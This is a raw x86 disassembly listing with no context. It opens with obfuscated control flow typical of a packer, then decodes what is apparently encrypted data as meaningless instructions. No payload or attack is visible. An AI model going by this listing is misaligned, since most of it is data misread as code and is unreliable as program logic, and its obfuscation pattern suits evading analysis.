  41693b:	add    DWORD PTR ds:0x428e33,0x428e43
  416945:	and    edx,ebx
  416947:	movzx  ebx,WORD PTR ds:0x428e3b
  41694e:	xor    DWORD PTR ds:0x428eb7,ebx
  416954:	mov    DWORD PTR [ebp-0x4c],edx
  416957:	add    ebx,DWORD PTR ds:0x428ebf
  41695d:	mov    edx,DWORD PTR [ebp+0x8]
  416960:	or     ebx,DWORD PTR ds:0x428e33
  416966:	mov    ebx,DWORD PTR [ebp-0x48]
  416969:	lea    edx,[ebx+edx*1+0x241fcdf]
  416970:	xor    DWORD PTR ds:0x428eab,0x519b
  41697a:	mov    DWORD PTR [ebp-0x48],edx
  41697d:	mov    edx,DWORD PTR [ebp+0x8]
  416980:	and    DWORD PTR ds:0x428eab,0x0
  41698a:	jmp    0x41699e
  41698f:	xor    ebx,ebx
  416991:	or     ebx,DWORD PTR ds:0x428eab
  416997:	inc    ebx
  416998:	mov    DWORD PTR ds:0x428eab,ebx
  41699e:	cmp    DWORD PTR ds:0x428eab,0x1b
  4169a5:	jae    0x4169e7
  4169ab:	cmp    DWORD PTR ds:0x428eab,0xb
  4169b2:	jbe    0x4169e7
  4169b8:	jmp    0x4169c8
  4169bd:	push   0x42815b
  4169c2:	call   DWORD PTR ds:0x42aa0b
  4169c8:	cmp    DWORD PTR ds:0x428eab,0xa
  4169cf:	jne    0x4169e2
  4169d5:	mov    ebx,DWORD PTR ds:0x428eab
  4169db:	inc    ebx
  4169dc:	mov    DWORD PTR ds:0x428eab,ebx
  4169e2:	jmp    0x41698f
  4169e7:	mov    ebx,0xfa5e1522
  4169ec:	or     DWORD PTR ds:0x428e7b,0x3b15
  4169f6:	sub    ebx,edx
  4169f8:	add    ebx,DWORD PTR [ebp-0x44]
  4169fb:	mov    DWORD PTR [ebp-0x44],ebx
  4169fe:	mov    edx,DWORD PTR ds:0x428e8f
  416a04:	xor    edx,DWORD PTR ds:0x428e27
  416a0a:	mov    DWORD PTR ds:0x428e8f,edx
  416a10:	mov    edx,DWORD PTR [ebp+0x8]
  416a13:	xor    edx,eax
  416a15:	add    edx,esi
  416a17:	jne    0x416767
  416a1d:	mov    DWORD PTR ds:0x428ea3,0x25d2
  416a27:	jmp    0x4191f8
  416a2c:	mov    edx,DWORD PTR [ebp-0xc]
  416a2f:	xor    ebx,ebx
  416a31:	or     ebx,DWORD PTR ds:0x428ea3
  416a37:	xor    ebx,DWORD PTR ds:0x428ea7
  416a3d:	mov    DWORD PTR ds:0x428ea3,ebx
  416a43:	sub    edx,esi
  416a45:	xor    edx,eax
  416a47:	sbb    ebx,DWORD PTR ds:0x428e87
  416a4d:	mov    DWORD PTR [ebp-0x5c],edx
  416a50:	jmp    0x418e09
  416a55:	out    0xe2,al
  416a57:	dec    edx
  416a58:	mov    dl,0x46
  416a5a:	stos   BYTE PTR es:[edi],al
  416a5b:	xchg   BYTE PTR [esi+0x2de23c83],dl
  416a61:	add    al,bh
  416a63:	dec    esi
  416a64:	or     ecx,edi
  416a66:	inc    esp
  416a67:	add    BYTE PTR [ebx-0x7c7c9f19],0xb6
  416a6e:	adc    BYTE PTR [edi+ebx*4-0x5d],dl
  416a72:	scas   eax,DWORD PTR es:[edi]
  416a73:	jb     0x416a74
  416a75:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416a76:	mov    esp,0x63633408
  416a7b:	mov    cl,0x7c
  416a7d:	sti    
  416a7e:	hlt    
  416a7f:	retf   0x5c17
  416a82:	add    al,0x6b
  416a84:	lods   al,BYTE PTR ds:[esi]
  416a85:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416a86:	and    DWORD PTR [esi+0x26fb45d2],eax
  416a8c:	je     0x416a56
  416a8e:	xchg   edi,eax
  416a8f:	cmp    BYTE PTR [edi],bh
  416a91:	sub    DWORD PTR [ecx+eiz*4-0x7bdbb311],eax
  416a98:	adc    DWORD PTR [ecx],esi
  416a9a:	sub    al,0xe5
  416a9c:	jo     0x416aad
  416a9e:	ins    BYTE PTR es:[edi],dx
  416a9f:	fistp  QWORD PTR [ebx]
  416aa1:	pop    ebp
  416aa3:	add    eax,0xd84f9a16
  416aa8:	xlat   BYTE PTR ds:[ebx]
  416aa9:	jp     0x416a54
  416aab:	stc    
  416aac:	(bad)  
  416aad:	int3   
  416aae:	sbb    dh,BYTE PTR [eax-0x15725cf4]
  416ab4:	inc    eax
  416ab5:	outs   dx,BYTE PTR ds:[esi]
  416ab6:	push   es
  416ab7:	mul    DWORD PTR [eax+0x34b0a2a4]
  416abd:	xchg   ebp,eax
  416abe:	xchg   BYTE PTR [edi+esi*1-0x4c],dh
  416ac2:	dec    esi
  416ac3:	aad    0xe8
  416ac5:	call   0xca6b:0x8857f3a
  416acc:	pop    es
  416acd:	stos   BYTE PTR es:[edi],al
  416ace:	aam    0xe0
  416ad0:	cld    
  416ad1:	dec    ecx
  416ad2:	mov    bl,0x60
  416ad4:	std    
  416ad5:	jle    0x416a58
  416ad7:	add    ch,BYTE PTR [edx-0x25]
  416ada:	lock sbb BYTE PTR [ebp-0x69],dh
  416ade:	call   0x2978db6d
  416ae3:	mov    dl,0x70
  416ae5:	ret    
  416ae6:	dec    ecx
  416ae7:	iret   
  416ae8:	hlt    
  416ae9:	jns    0x416b6a
  416aeb:	dec    ax
  416aed:	mov    eax,ds:0x795a3fcd
  416af2:	jbe    0x416b37
  416af4:	sub    esi,ebx
  416af6:	fisubr DWORD PTR [eax]
  416af8:	data16 fs xor al,0xa1
  416afc:	mov    esp,0x9af867d5
  416b01:	xchg   esi,eax
  416b02:	in     eax,0x27
  416b04:	mov    BYTE PTR ds:[ebp-0x2e7db36c],dh
  416b0b:	js     0x416b0f
  416b0d:	idiv   DWORD PTR [ecx-0x38f9a291]
  416b13:	loopne 0x416b69
  416b15:	add    esp,DWORD PTR [edx+0x13b3667f]
  416b1b:	jo     0x416b41
  416b1d:	pop    ebp
  416b1e:	sub    ebp,esi
  416b20:	aad    0x2c
  416b22:	shr    ebp,cl
  416b24:	dec    ebp
  416b25:	pop    es
  416b26:	pop    esi
  416b27:	mov    dl,0xd5
  416b29:	xlat   BYTE PTR ds:[ebx]
  416b2a:	xchg   esi,eax
  416b2b:	cs cdq 
  416b2d:	sbb    al,0xcb
  416b2f:	sbb    BYTE PTR [edi],bh
  416b31:	xchg   ebx,eax
  416b32:	pop    esp
  416b33:	das    
  416b34:	fld    DWORD PTR [esi+0x6f321c55]
  416b3a:	into   
  416b3b:	xor    al,0x73
  416b3d:	jg     0x416b34
  416b3f:	and    BYTE PTR [esi],ah
  416b41:	out    0x8a,al
  416b43:	adc    BYTE PTR [esi+ecx*2],ah
  416b46:	add    al,0x65
  416b48:	pop    esp
  416b49:	lea    ebx,[ebx+edi*8-0x49]
  416b4d:	xchg   ebp,ebx
  416b4f:	lds    esp,FWORD PTR [edi]
  416b51:	or     BYTE PTR [ebx-0x4f5bfeb0],dl
  416b57:	lds    edi,FWORD PTR [eax]
  416b59:	pushf  
  416b5a:	not    BYTE PTR [esi+0x49]
  416b5d:	push   esp
  416b5e:	cmp    al,0xf7
  416b60:	scas   eax,DWORD PTR es:[edi]
  416b61:	inc    edx
  416b62:	es push ebx
  416b64:	xchg   ah,ch
  416b66:	mov    ch,0x87
  416b68:	push   edx
  416b69:	stos   DWORD PTR es:[edi],eax
  416b6a:	fcmovu st,st(1)
  416b6c:	jmp    0x416bd7
  416b6e:	jne    0x416b35
  416b70:	aaa    
  416b71:	enter  0x516d,0xcd
  416b75:	cdq    
  416b76:	pop    es
  416b77:	jo     0x416b6a
  416b79:	push   0xb
  416b7b:	adc    al,0x74
  416b7d:	test   BYTE PTR ds:0x285438a2,cl
  416b83:	fwait
  416b84:	ret    0x4aee
  416b87:	ret    
  416b88:	fld    TBYTE PTR [edi]
  416b8a:	cdq    
  416b8b:	fdiv   DWORD PTR [ebp-0x2d6f1c3c]
  416b91:	jbe    0x416b88
  416b93:	sub    ebx,DWORD PTR [ebp-0xaf39b17]
  416b99:	mov    bh,0x12
  416b9b:	fisttp QWORD PTR [edx]
  416b9d:	ficom  WORD PTR es:[bp+di]
  416ba1:	fidivr DWORD PTR [ecx+ebp*2]
  416ba4:	aad    0xb4
  416ba6:	bound  eax,QWORD PTR [eax+0x7f]
  416ba9:	inc    eax
  416baa:	mov    ebx,0xc4cb6147
  416baf:	je     0x416b3a
  416bb1:	ds loopne 0x416b65
  416bb4:	mov    esi,0x55beb0e4
  416bb9:	xor    al,0xf9
  416bbb:	adc    eax,DWORD PTR [esi-0x72795b6e]
  416bc1:	mov    WORD PTR [esi-0x562560c8],fs
  416bc7:	xchg   esi,eax
  416bc8:	jle    0x416bab
  416bca:	(bad)  
  416bcc:	stos   DWORD PTR es:[edi],eax
  416bcd:	pop    eax
  416bce:	xor    cl,BYTE PTR [edx]
  416bd0:	outs   dx,DWORD PTR ds:[esi]
  416bd1:	mov    bh,BYTE PTR [ebp+0x186ee278]
  416bd7:	jmp    0x7af5:0xaa2ed808
  416bde:	push   0xffffff99
  416be0:	shl    DWORD PTR [eax+0x78fc9c8c],cl
  416be6:	pushf  
  416be7:	mov    edi,0xfc2e58fb
  416bec:	pop    edx
  416bed:	les    eax,FWORD PTR [edx+0x4523d267]
  416bf3:	dec    eax
  416bf4:	jp     0x416c3d
  416bf6:	jl     0x416be8
  416bf8:	repz jne 0x416b9e
  416bfb:	aam    0xcb
  416bfd:	xor    edx,ebx
  416bff:	lock add dl,BYTE PTR [esi+0x6e446bf9]
  416c06:	jns    0x416bb3
  416c08:	push   edx
  416c09:	mov    al,0xb1
  416c0b:	adc    eax,0xfff9d778
  416c10:	mov    dl,BYTE PTR fs:[edi+0x6f5662a2]
  416c17:	inc    BYTE PTR [ecx]
  416c19:	push   ecx
  416c1a:	mov    BYTE PTR [edi+0x29e20277],cl
  416c20:	and    eax,0x2a7be242
  416c25:	stos   BYTE PTR es:[edi],al
  416c26:	push   esp
  416c28:	aas    
  416c29:	mov    ebx,0x37a4e99c
  416c2e:	fnstenv [edi+ebx*2-0xc]
  416c32:	dec    DWORD PTR [edx+0x18]
  416c35:	scas   eax,DWORD PTR es:[edi]
  416c36:	push   ds
  416c37:	xchg   edx,eax
  416c38:	pop    edx
  416c39:	mov    WORD PTR [esi],fs
  416c3b:	lods   al,BYTE PTR ds:[esi]
  416c3c:	gs into 
  416c3e:	es xor al,0x85
  416c41:	mov    ch,0xae
  416c43:	sahf   
  416c44:	test   bl,ah
  416c46:	nop
  416c47:	pop    edx
  416c48:	int3   
  416c49:	gs dec eax
  416c4b:	lock cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416c4d:	cld    
  416c4e:	xor    DWORD PTR [ebx],ecx
  416c50:	lods   al,BYTE PTR ds:[esi]
  416c51:	fcmovbe st,st(7)
  416c53:	retf   
  416c54:	fdivr  DWORD PTR [ebx+0x45]
  416c57:	mov    ds:0x99be3478,al
  416c5c:	fld    QWORD PTR [esp+esi*2]
  416c5f:	pusha  
  416c60:	fwait
  416c61:	cmp    ebx,eax
  416c63:	jne    0x416cd6
  416c65:	sub    al,0xbf
  416c67:	out    dx,al
  416c68:	dec    eax
  416c69:	and    edi,DWORD PTR [edi-0x776b7909]
  416c6f:	iret   
  416c70:	sub    eax,0x6bb09e43
  416c75:	xchg   BYTE PTR [bp+di-0x20],ch
  416c79:	sbb    dh,dl
  416c7b:	cld    
  416c7c:	mov    ds:0xe072b5f1,al
  416c81:	push   esp
  416c82:	or     ebp,DWORD PTR [ebx+esi*4+0x76]
  416c86:	pop    ss
  416c87:	add    esi,ecx
  416c89:	pop    ecx
  416c8a:	xor    DWORD PTR [ecx],ebx
  416c8c:	(bad)  
  416c8d:	xor    BYTE PTR [ebp+0x32],ah
  416c90:	daa    
  416c91:	fcmove st,st(5)
  416c93:	test   eax,0x716b05b5
  416c98:	(bad)  
  416c99:	mov    dl,0xfa
  416c9b:	daa    
  416c9c:	push   0x6b1e4f57
  416ca1:	cwde   
  416ca2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416ca3:	pushf  
  416ca4:	shr    DWORD PTR [edx+0x18],0x5e
  416ca8:	test   eax,0xfc630c77
  416cad:	nop
  416cae:	mov    ds:0x6a10e814,eax
  416cb3:	retf   0x316c
  416cb6:	mov    ebp,ds
  416cb8:	xchg   esi,eax
  416cb9:	dec    edx
  416cba:	push   es
  416cbb:	jne    0x416cc0
  416cbd:	outs   dx,BYTE PTR ds:[esi]
  416cbe:	dec    esi
  416cbf:	(bad)  
  416cc0:	ror    DWORD PTR [ecx-0x28],1
  416cc3:	cld    
  416cc4:	mov    dh,0x19
  416cc6:	pop    es
  416cc7:	inc    edi
  416cc8:	lock data16 (bad) 
  416ccb:	in     eax,0x9c
  416ccd:	aad    0xd
  416ccf:	pop    es
  416cd0:	xchg   esp,eax
  416cd1:	adc    esi,DWORD PTR [esi-0x69]
  416cd4:	xor    bh,BYTE PTR [edi+0x67c51b47]
  416cda:	loop   0x416cb9
  416cdc:	dec    esp
  416cdd:	or     ah,BYTE PTR ds:0x7f6affd6
  416ce3:	jmp    0x416d02
  416ce5:	and    eax,0x91f3aa2e
  416cea:	cwde   
  416ceb:	mov    edi,0x4a1ac6e5
  416cf0:	mov    edx,esp
  416cf2:	into   
  416cf3:	ins    BYTE PTR es:[edi],dx
  416cf4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416cf5:	dec    esi
  416cf6:	xchg   ebx,eax
  416cf7:	pop    DWORD PTR [eax-0x33]
  416cfa:	and    bl,BYTE PTR [ebp+0x54]
  416cfd:	test   al,0xda
  416cff:	mov    al,ds:0xede1f0ce
  416d04:	jb     0x416d26
  416d06:	pushf  
  416d07:	mov    al,ds:0xadf0453b
  416d0c:	test   DWORD PTR [eax+0x222fd987],0x6c4dbf7f
  416d16:	dec    esp
  416d17:	dec    ebx
  416d18:	out    0x0,eax
  416d1a:	lds    esp,FWORD PTR [edx]
  416d1c:	mov    bl,0xa0
  416d1e:	cmp    cl,BYTE PTR [ecx+0x72]
  416d21:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416d22:	pop    edx
  416d23:	repnz sub BYTE PTR [ebp-0x5eaa7c25],0xad
  416d2b:	test   BYTE PTR [eax-0x3],bh
  416d2e:	mov    ds:0x4ff6ae40,al
  416d33:	fwait
  416d34:	shl    cl,cl
  416d36:	inc    ebp
  416d37:	inc    edx
  416d38:	(bad)  
  416d39:	xor    edx,esp
  416d3b:	cmp    DWORD PTR [ebp-0x4],ebp
  416d3e:	pop    edx
  416d3f:	inc    DWORD PTR [ecx+0x1256d908]
  416d45:	pop    es
  416d46:	fisttp QWORD PTR ds:0x5c0d740c
  416d4c:	ret    0x887
  416d4f:	push   es
  416d50:	or     DWORD PTR [esi-0x3dd5b820],edx
  416d56:	mov    dh,0xb
  416d58:	cmp    al,BYTE PTR [eax+edi*2]
  416d5b:	push   edi
  416d5c:	arpl   WORD PTR [ebp-0x47648664],dx
  416d62:	sbb    ah,dh
  416d64:	mov    ecx,0x958f7a50
  416d69:	inc    edx
  416d6a:	push   eax
  416d6b:	cmp    dl,BYTE PTR [ebx+0x11]
  416d6e:	nop
  416d6f:	push   esi
  416d70:	enter  0x3c4d,0x31
  416d74:	loop   0x416db3
  416d76:	lds    esp,FWORD PTR [edx-0x6b]
  416d79:	cmp    ecx,ebx
  416d7b:	(bad)
  416d7e:	push   ds
  416d7f:	sti    
  416d80:	mov    esp,0x3c4e5be8
  416d85:	push   ecx
  416d86:	cmp    edi,0xc74492eb
  416d8c:	out    0xee,al
  416d8e:	fild   QWORD PTR [ebx+0x15f8e74c]
  416d94:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416d95:	retf   
  416d96:	cli    
  416d97:	sub    dl,BYTE PTR [edi+eiz*4-0x205172fe]
  416d9e:	pop    esp
  416d9f:	xchg   ecx,eax
  416da0:	clc    
  416da1:	call   0x5a81a89b
  416da6:	sbb    esp,DWORD PTR [esi]
  416da8:	mov    WORD PTR [edi+0x56a740a8],cs
  416dae:	push   edx
  416daf:	push   ebp
  416db0:	ror    eax,1
  416db2:	(bad)  
  416db3:	mov    dl,0x6d
  416db5:	out    dx,al
  416db6:	mov    dl,0x32
  416db8:	jecxz  0x416e06
  416dba:	push   0xb49be6c8
  416dbf:	push   eax
  416dc0:	call   0xa9eef17
  416dc5:	dec    ecx
  416dc6:	aam    0xa6
  416dc8:	jne    0x416d88
  416dca:	stos   DWORD PTR es:[edi],eax
  416dcb:	inc    ebx
  416dcc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416dcd:	mov    esp,0x29857a6d
  416dd2:	pop    esi
  416dd3:	test   al,0xd9
  416dd5:	push   ss
  416dd6:	inc    eax
  416dd7:	arpl   sp,ax
  416dd9:	dec    ebx
  416dda:	and    ebp,DWORD PTR [esi+edi*4-0x78]
  416dde:	mov    bh,BYTE PTR [esi-0x78]
  416de1:	dec    ebx
  416de2:	and    esp,DWORD PTR [bp+0x17e8]
  416de7:	lea    ebp,[ebx+0x610e2c50]
  416ded:	jns    0x416d93
  416def:	inc    ebx
  416df0:	mov    eax,ds:0x4341df83
  416df5:	popf   
  416df6:	sbb    DWORD PTR [eax+0x7b47c0b7],edx
  416dfc:	outs   dx,DWORD PTR cs:[esi]
  416dfe:	mov    ecx,DWORD PTR [eax]
  416e00:	sbb    al,BYTE PTR [esi-0x63]
  416e03:	lea    ecx,[ebx+0x66e67510]
  416e09:	retf   
  416e0a:	cmp    eax,DWORD PTR [ebx+0x26]
  416e0d:	aam    0x4
  416e0f:	leave  
  416e10:	mov    edx,0x9c61b7f2
  416e15:	jl     0x416e6e
  416e17:	in     al,0xbf
  416e19:	sti    
  416e1a:	jne    0x416dcc
  416e1c:	test   DWORD PTR [ebp-0x4c],0xaf3f56e1
  416e23:	pop    esp
  416e24:	(bad)  
  416e25:	jle    0x416dc7
  416e27:	rcl    BYTE PTR [edi+0x42aa0a3],cl
  416e2d:	jmp    0x416dc2
  416e2f:	ror    DWORD PTR ds:0xea0a90e2,1
  416e35:	adc    BYTE PTR [ebx+edi*1-0x16],bl
  416e39:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416e3a:	ja     0x416e8b
  416e3c:	pop    ecx
  416e3d:	in     eax,0x4d
  416e3f:	cdq    
  416e40:	jo     0x416e3f
  416e42:	or     eax,0xc77a29b0
  416e47:	mov    cl,0x14
  416e49:	cmp    al,0x6
  416e4b:	add    BYTE PTR [edx+0x63],al
  416e4e:	fcomip st,st(2)
  416e50:	mov    ecx,0x8922db15
  416e55:	mov    ch,0x44
  416e57:	outs   dx,DWORD PTR ds:[esi]
  416e58:	sbb    BYTE PTR [ebp+0x20],dl
  416e5b:	mov    ecx,0xf32e756c
  416e60:	outs   dx,DWORD PTR ds:[esi]
  416e61:	xchg   edi,eax
  416e62:	hlt    
  416e63:	or     dl,ch
  416e65:	lods   eax,DWORD PTR ds:[esi]
  416e66:	int    0x26
  416e68:	(bad)
  416e6b:	int3   
  416e6c:	and    DWORD PTR [edx-0x27],esp
  416e6f:	out    dx,eax
  416e70:	popa   
  416e71:	cld    
  416e72:	sbb    dh,BYTE PTR [edi*4+0x26e96bbb]
  416e79:	shr    DWORD PTR ds:0xc2e62d2,1
  416e7f:	pop    esp
  416e80:	pop    esi
  416e81:	mov    edi,0x9acf69e9
  416e86:	adc    DWORD PTR [esi-0x6d437367],esp
  416e8c:	dec    edx
  416e8d:	cs dec ebx
  416e8f:	inc    esp
  416e90:	shl    DWORD PTR [ebp+0x24],0x43
  416e94:	test   eax,0xfc5271bd
  416e99:	inc    edi
  416e9a:	push   ecx
  416e9b:	fld    st(3)
  416e9d:	inc    esp
  416e9e:	push   ds
  416e9f:	aam    0x46
  416ea1:	je     0x416e90
  416ea3:	jl     0x416e46
  416ea5:	sub    BYTE PTR [edi+0x70],al
  416ea8:	pop    edi
  416ea9:	arpl   dx,cx
  416eab:	inc    edx
  416eac:	mov    ds:0x7d8bfd12,al
  416eb1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416eb2:	fcomp  QWORD PTR [edi-0x5af8cc13]
  416eb8:	jbe    0x416e9d
  416eba:	shl    DWORD PTR [edi],cl
  416ebc:	iret   
  416ebd:	mov    bh,0xb9
  416ebf:	fisubr WORD PTR [ebx+0x72]
  416ec2:	sbb    eax,0xb31078b
  416ec7:	mov    bh,0x1f
  416ec9:	les    esp,FWORD PTR [edx]
  416ecb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416ecc:	push   edi
  416ecd:	jmp    0x416f47
  416ecf:	add    al,0x63
  416ed1:	or     al,0xaa
  416ed3:	sub    bl,BYTE PTR [ecx+ecx*4]
  416ed6:	or     ecx,edx
  416ed8:	pop    ebp
  416ed9:	xchg   ebx,ecx
  416edb:	pop    ss
  416edc:	dec    ebp
  416edd:	es cld 
  416edf:	outs   dx,BYTE PTR ds:[esi]
  416ee0:	scas   eax,DWORD PTR es:[edi]
  416ee1:	cmp    eax,0xf4262586
  416ee6:	xchg   edi,eax
  416ee7:	(bad)  
  416ee8:	jl     0x416ea3
  416eea:	sar    BYTE PTR [edi+0x5f691fce],0x48
  416ef1:	fwait
  416ef2:	mov    esp,0x16e90c90
  416ef7:	test   al,0xe7
  416ef9:	xchg   ebp,eax
  416efa:	sub    DWORD PTR [ebx+edx*1],edx
  416efd:	lock dec ebp
  416eff:	xchg   ebp,eax
  416f00:	pop    ecx
  416f01:	(bad)  
  416f02:	mov    WORD PTR [esi+edx*2+0x50],?
  416f06:	pop    es
  416f07:	pop    ebx
  416f08:	mov    gs,WORD PTR [ebx]
  416f0a:	ror    DWORD PTR [ebx],1
  416f0c:	sub    BYTE PTR [edx+ebp*8-0x6],bh
  416f10:	dec    ecx
  416f11:	sbb    al,al
  416f13:	and    BYTE PTR [edi-0x33],al
  416f16:	cmp    al,bh
  416f18:	lea    ecx,[ecx]
  416f1a:	lahf   
  416f1b:	mov    bl,BYTE PTR [esi+0x19]
  416f1e:	add    al,BYTE PTR [edi-0x10]
  416f21:	rol    BYTE PTR [ebp+0xf93bb69],0x1d
  416f28:	and    ebp,DWORD PTR [ebx-0x3b]
  416f2b:	jae    0x416efe
  416f2d:	dec    esp
  416f2e:	fcom   st(2)
  416f30:	push   cs
  416f31:	xchg   esi,eax
  416f32:	scas   eax,DWORD PTR es:[edi]
  416f33:	sti    
  416f34:	cld    
  416f35:	push   ecx
  416f36:	cwde   
  416f37:	cwde   
  416f38:	push   ds
  416f39:	dec    ebx
  416f3a:	call   0xeda8:0x6b9b00f2
  416f41:	aaa    
  416f42:	jbe    0x416f0d
  416f44:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416f45:	pop    ss
  416f46:	push   ss
  416f47:	cmp    bh,BYTE PTR [eax]
  416f49:	xor    DWORD PTR [eax+0x4bc2736d],eax
  416f4f:	inc    ebx
  416f50:	data16 xchg bh,cl
  416f53:	outs   dx,DWORD PTR ds:[esi]
  416f54:	sahf   
  416f55:	push   0x24
  416f57:	push   eax
  416f58:	pop    eax
  416f59:	xor    ah,BYTE PTR [ebx]
  416f5b:	fs inc ebx
  416f5d:	test   eax,0xaa822f1a
  416f62:	test   al,0xa3
  416f64:	push   ecx
  416f65:	mov    eax,0xd5027908
  416f6a:	shl    BYTE PTR [ebp+0x10fdba62],0xd1
  416f71:	loopne 0x416f34
  416f73:	fsubp  st(0),st
  416f75:	call   0x2b08:0xb16ae9dd
  416f7c:	(bad)  
  416f7e:	imul   esp,DWORD PTR [ebx-0x1142ed55],0x30aa155e
  416f88:	inc    edi
  416f89:	sub    edx,ebp
  416f8b:	ret    
  416f8c:	icebp  
  416f8d:	popf   
  416f8e:	sti    
  416f8f:	js     0x416f63
  416f91:	sub    cl,ch
  416f93:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416f94:	push   0x7
  416f96:	xor    DWORD PTR [ecx+0x648669a6],eax
  416f9c:	loope  0x416ff3
  416f9e:	adc    DWORD PTR [ecx],esi
  416fa0:	mov    esi,0xe9fffaaa
  416fa5:	jne    0x417020
  416fa7:	jae    0x416f3e
  416fa9:	jg     0x416f5e
  416fab:	inc    ebx
  416fac:	mov    ecx,0x63102bda
  416fb1:	loope  0x416f59
  416fb3:	pop    esi
  416fb4:	fild   DWORD PTR [edi]
  416fb6:	test   DWORD PTR [ebx+0x718acbc2],edi
  416fbc:	fidiv  DWORD PTR [esi-0x61405545]
  416fc2:	ss pop edi
  416fc4:	mov    ds:0x5c1c79c9,eax
  416fc9:	mov    ch,0x7
  416fcb:	test   DWORD PTR [ecx],edx
  416fcd:	xchg   esp,eax
  416fce:	pop    esi
  416fcf:	shl    BYTE PTR [eax-0x39],1
  416fd2:	or     DWORD PTR [ebp-0x15],edi
  416fd5:	mov    cl,0xb9
  416fd7:	enter  0xbcc8,0xb
  416fdb:	xrelease xchg DWORD PTR [edi-0x6b],esp
  416fdf:	adc    DWORD PTR [ecx-0x766c3c5],eax
  416fe5:	inc    esi
  416fe6:	mov    al,0x5a
  416fe8:	mov    esi,0x3d82b046
  416fed:	mov    al,ds:0x4f5ac444
  416ff2:	or     eax,0x772597b0
  416ff7:	push   esp
  416ff8:	shl    BYTE PTR [ebx+0xce1163c],1
  416ffe:	sub    dl,BYTE PTR [ebx]
  417000:	mov    cl,0xc8
  417002:	mov    DWORD PTR [ecx+0xc0cbd25],edi
  417008:	bound  esi,QWORD PTR [edx+edx*8-0x70]
  41700c:	test   al,0x37
  41700e:	bound  eax,QWORD PTR [ebx]
  417010:	fwait
  417011:	xlat   BYTE PTR ds:[ebx]
  417012:	jle    0x416fdf
  417014:	and    BYTE PTR [edi-0xd0d6eae],0xbf
  41701b:	or     BYTE PTR [ecx],cl
  41701d:	xlat   BYTE PTR ds:[ebx]
  41701e:	test   bl,ch
  417020:	in     al,dx
  417021:	xchg   ecx,eax
  417022:	dec    esp
  417023:	mov    ah,0xa
  417025:	cmp    DWORD PTR [edi+0x2c415a90],ebp
  41702b:	retf   
  41702c:	jmp    0x417083
  41702e:	stos   DWORD PTR es:[edi],eax
  41702f:	sbb    BYTE PTR [ebx+eax*2+0x370dcc68],dh
  417036:	adc    ch,ch
  417038:	jg     0x417060
  41703a:	cmp    eax,0xcca04c7d
  41703f:	loopne 0x417083
  417041:	mov    al,0x65
  417043:	pop    ebp
  417044:	and    BYTE PTR [ecx],dl
  417046:	dec    ebx
  417047:	loop   0x417044
  417049:	mov    edi,0xabd9d847
  41704e:	dec    esi
  41704f:	ror    DWORD PTR [ebx+ebp*2],1
  417052:	pop    es
  417053:	xor    BYTE PTR [eax+0x3aa0b77a],dh
  417059:	jmp    0x203e8404
  41705e:	mov    esi,0x5995860c
  417063:	and    dl,ch
  417065:	adc    eax,0x6fbf53ea
  41706a:	hlt    
  41706b:	inc    edi
  41706c:	in     eax,dx
  41706d:	test   BYTE PTR [ecx+0x70],0x86
  417071:	test   DWORD PTR [ecx+edi*8+0x7bdf318d],0xb3a8c4b
  41707c:	rep stos DWORD PTR es:[edi],eax
  41707e:	(bad)  
  417080:	push   ecx
  417081:	call   DWORD PTR [esi-0xb]
  417084:	ins    BYTE PTR es:[edi],dx
  417085:	xor    eax,0x105a5837
  41708a:	gs and eax,0x4f661090
  417090:	push   0x59
  417092:	mov    fs:0xaa4bcb2,eax
  417098:	inc    esi
  417099:	test   al,0x84
  41709b:	push   ecx
  41709c:	cli    
  41709d:	cmp    al,0x1
  41709f:	aad    0x8
  4170a1:	shl    dh,cl
  4170a3:	pop    ecx
  4170a4:	sbb    DWORD PTR [esi],edx
  4170a6:	jmp    0xdd01:0x4d94c713
  4170ad:	pop    ecx
  4170ae:	gs jnp 0x4170c7
  4170b1:	mov    dh,0x5
  4170b3:	xchg   edx,eax
  4170b4:	sti    
  4170b5:	xadd   BYTE PTR [esp+edx*4+0x6909e892],bl
  4170bd:	sbb    al,0x42
  4170bf:	into   
  4170c0:	sub    eax,0x9fcb71dd
  4170c5:	pop    es
  4170c6:	jl     0x417065
  4170c8:	xchg   ebx,eax
  4170c9:	jbe    0x4170f9
  4170cb:	ins    BYTE PTR es:[edi],dx
  4170cc:	(bad)  
  4170ce:	cdq    
  4170cf:	stc    
  4170d0:	sub    al,0xe
  4170d2:	sbb    BYTE PTR [eax],al
  4170d4:	mov    bl,0xcd
  4170d6:	lds    ebp,FWORD PTR [ecx-0x399fbe2c]
  4170dc:	dec    edi
  4170dd:	call   0xdd8261bd
  4170e2:	mov    ebp,0x322f6eaf
  4170e7:	pop    esi
  4170e8:	inc    ebp
  4170e9:	mov    esp,0x8caf5f6c
  4170ee:	mov    bl,0x65
  4170f0:	mov    DWORD PTR [esi+0x9ae8975],eax
  4170f6:	in     al,0x8d
  4170f8:	ffreep st(1)
  4170fa:	ds mov bl,0x19
  4170fd:	test   al,0x33
  4170ff:	test   eax,0x76221ad6
  417104:	jp     0x417185
  417106:	xchg   esi,eax
  417107:	push   0xd3af0412
  41710c:	dec    ebx
  41710d:	hlt    
  41710e:	dec    edx
  41710f:	sbb    eax,0x9fc7b59
  417114:	es aam 0x1c
  417117:	mov    dh,0x23
  417119:	mov    eax,0x1af76b28
  41711e:	sub    BYTE PTR [esi],bh
  417120:	hlt    
  417121:	scas   eax,DWORD PTR es:[edi]
  417122:	retf   
  417123:	jl     0x4170ba
  417125:	call   FWORD PTR [edx-0x80]
  417128:	add    eax,0xaaf7c29a
  41712d:	sbb    DWORD PTR [ebx+esi*2+0x4f],esp
  417131:	inc    ebx
  417132:	leave  
  417133:	repnz aaa 
  417135:	(bad)  
  417138:	jns    0x4171b8
  41713a:	inc    esp
  41713b:	shl    BYTE PTR [edi],cl
